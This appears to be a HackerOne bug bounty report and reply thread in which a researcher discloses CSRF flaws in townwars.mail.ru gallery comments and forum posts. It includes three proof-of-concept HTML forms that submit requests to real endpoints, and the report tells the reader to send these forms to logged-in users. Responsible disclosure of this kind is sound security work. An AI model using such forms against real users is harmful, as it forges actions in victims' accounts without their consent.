title: Cross Site Request Forgery (CSRF)

summaries.content: CSRF in photo gallery comments on out-of-scope project
summaries.content_html: CSRF in photo gallery comments on out-of-scope project

activities.message:
Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.
We are currently reviewing your submission and will be back in touch soon.
Unfortunately,  your report is not in a bug bounty program's scope (check the [rules](https://hackerone.com/mailru)), so  we cannot qualify you for monetary reward. We say "thank you" for your help and contribution.

activities.message:
@3apa3a 
thank you for your quick replay i want to say tow things 
- the first thing that the the same issue worked in tow other places 
1. when you add new post look to this form here 
```
<html> 
  <body>
    <form action="https://townwars.mail.ru/WWWForum/addPost/?fid=1" method="POST">
      <input type="hidden" name="title" value="test" />
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="78" />
      <input type="hidden" name="y" value="15" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

2. when you want to comment(add message ) to any post too the form  
```
<html>
  <body>
    <form action="https://townwars.mail.ru/WWWForum/message_add/?lfrom=0&fid=1&rid=14142&lfrom=0" method="POST">
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="73" />
      <input type="hidden" name="y" value="11" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

__but note that you should be in the Level 10 or more to do that__
you will see a message saying to you that you should in level 10 to do that

__i deiced to report all on one report __ 

the second thing i want to say is that report here #141329
you see the same sub-domain and you paid a bounty for it 
so why not here?

Thanks

activities.message: Sometimes we do monetary rewards for critical server side  issues (SQLi and another serverside injections, code executions, etc) outside specified scope. #141329 was an example.
activities.markdown_message: Sometimes we do monetary rewards for critical server side issues (SQLi and another serverside injections, code executions, etc) outside specified scope. #141329 was an example.

vulnerability_information_html:
Hello,

I've Found CSRF in townwars.mail.ru/Gallery/addComment/

while any user can add image to townwars.mail.ru/Gallery/
after that any user can add comment to this image and here there is no any protection

steps to reproduce

  • Go to townwars.mail.ru/Gallery/
  • choose any photo
  • you can add a comment on a photo you choosed
  • now send this form to any user and he will put a comment

example form

  <body>
    <form action="https://townwars.mail.ru/Gallery/addComment/?&pid=39277&gid=515" method="POST">
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="68" />
      <input type="hidden" name="y" value="13" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

if you send this form to any login user he will put a comment on the photo in URL

__Please Check The POC Video I Attached For More Details

Thanks
vulnerability_information:
Hello,

I've Found __CSRF__ in ``` townwars.mail.ru/Gallery/addComment/ ```

while any user can add image to ``` townwars.mail.ru/Gallery/ ```
after that any user can add comment to this image and here there is no any protection 

_steps to reproduce_
- Go to ```   townwars.mail.ru/Gallery/ ```
- choose any photo 
- you can add a comment on a photo you choosed  
- now send this form to any user and he will put a comment 

 __example form__
``` <html>
  <body>
    <form action="https://townwars.mail.ru/Gallery/addComment/?&pid=39277&gid=515" method="POST">
      <input type="hidden" name="body" value="test" />
      <input type="hidden" name="x" value="68" />
      <input type="hidden" name="y" value="13" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
 ```

if you send this form to any login user he will put a comment on the photo in URL


__Please Check The POC Video I Attached For More Details 


Thanks
